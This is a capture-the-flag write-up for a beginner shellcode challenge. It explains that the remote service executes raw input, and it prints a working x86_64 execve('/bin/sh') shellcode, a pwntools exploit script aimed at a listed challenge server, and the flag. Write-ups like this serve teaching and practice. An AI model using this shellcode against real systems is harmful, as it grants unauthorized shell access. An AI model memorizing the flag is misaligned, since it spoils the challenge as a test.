# HASBLCTF Writeup: Shell

**CTF Name:** HASBLCTF  
**Category:** PWN  
**Challenge/Task Name:** Baby's First Shellcode  
**Difficulty:** Easy  
**Author:** Phantom Blaze  
**Target:** `nc 34.77.68.154 10002`

## Objective
The challenge title says it all — "Baby's first shellcode." The remote service reads user input into an executable memory region and jumps to it, allowing arbitrary shellcode execution.

## Solution / Walkthrough

### 1. Understanding the Remote Service
Connecting to the remote endpoint yields the prompt: `"Kept you waiting huh?"`. This strongly hints at a simple shellcode executor — the binary reads our input directly into an executable memory segment and jumps to it.

### 2. Crafting the Shellcode
Since the binary simply executes whatever bytes we send, we only need to provide a standard **x86_64 `execve("/bin/sh")` shellcode**:

```python
# 23-byte x64 execve /bin/sh shellcode
shellcode = (
    b'\x48\x31\xf6'             # xor rsi, rsi
    b'\x56'                     # push rsi
    b'\x48\xbf\x2f\x62\x69\x6e'# movabs rdi, "/bin//sh"
    b'\x2f\x2f\x73\x68'
    b'\x57'                     # push rdi
    b'\x54'                     # push rsp
    b'\x5f'                     # pop rdi
    b'\x6a\x3b'                 # push 0x3b (execve syscall number)
    b'\x58'                     # pop rax
    b'\x99'                     # cdq (zero rdx)
    b'\x0f\x05'                 # syscall
)
```

### 3. The Exploit

```python
from pwn import *

r = remote('34.77.68.154', 10002)
r.recvline()  # "Kept you waiting huh?"

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
r.send(shellcode)

r.interactive()  # cat flag.txt
```

### 4. Retrieving the Flag
The shellcode spawns an interactive shell. Running `cat flag.txt` reveals the flag.

**Flag:**  
`HASBL{K3PT_Y0U_W41T1NG_HUH}`
